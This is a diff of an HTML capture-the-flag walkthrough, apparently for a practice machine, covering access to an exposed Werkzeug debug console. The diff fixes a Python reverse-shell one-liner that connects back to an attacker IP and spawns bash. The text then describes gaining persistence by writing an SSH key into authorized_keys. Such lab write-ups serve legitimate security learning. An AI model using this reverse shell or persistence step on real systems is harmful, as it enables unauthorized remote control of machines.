@@ -17,7 +17,7 @@ This indicates that we need to look for a parameter in the previous version. So 
 <br></br><img src='Screenshot (74).png'/><br></br>
 We have the show parameter which we can use to get the pin. Now we can use the pin at <b>http://{MACHINE IP}:5000/console</b> (I was not aware of what Werkzeug was so I had to manually enumerate for the /console).
 When you enter the pin you can access the console which executes python code.We can use that to get the shell, I used the python reverse shell for this but yuo are free to use any other shell
-<h5>'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{YOUR IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")</h5>
+<h5>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{YOUR IP}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")</h5>
 WWith this we get the shell as user. Improve the shell by adding your ssh public key(present at ~/.ssh/id_rsa.pub) to <b>.ssh/authorized_keys</b> of the user sid, you need to create the .ssh folder first.
 <h5>echo 'YOUR PUBLIC SSH KEY' > ~/.ssh/authorized_keys</h5>
 After adding the keys you can login with your private key. You can create ssh keys with <b>ssh-keygen</b>, read more about it <a href='https://www.ssh.com/ssh/keygen/'>here</a>
